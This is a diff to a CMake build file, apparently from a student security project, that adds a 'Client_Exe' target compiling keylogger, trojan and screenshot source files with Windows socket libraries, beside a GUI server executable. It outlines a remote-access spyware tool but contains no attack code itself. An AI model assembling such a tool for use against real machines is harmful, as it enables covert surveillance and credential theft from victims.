@@ -21,9 +21,26 @@ set(SDL2_sdl_image_LIB_DIR C:/clibs/sdl_image/lib/x64)
 include_directories(${SDL2_sdl_image_INCLUDE_DIR})
 link_directories(${SDL2_sdl_image_LIB_DIR})
 
-add_executable(6841Project server/server.c server/microui.c server/microui.h server_window.c server/render.c server/render.h
+add_executable(6841Project
+        server/server.c
+        server/microui.c
+        server/microui.h
+        server_window.c
+        server/render.c
+        server/render.h
+        functions/keylogger.c
+        functions/keylogger.h
+)
+
+add_executable(Client_Exe
         client/system.c
-        client/system.h)
+        client/system.h
+        functions/keylogger.c
+        functions/keylogger.h
+        client/trojan.c
+        client/screenshot.c
+        client/screenshot.h
+)
 
 target_link_libraries(6841Project SDL2main SDL2)
 target_link_libraries(6841Project SDL2_image)
@@ -31,4 +48,5 @@ target_link_libraries(6841Project SDL2_ttf)
 
 if(WIN32)
     target_link_libraries(6841Project wsock32 ws2_32)
+    target_link_libraries(Client_Exe wsock32 ws2_32)
 endif()
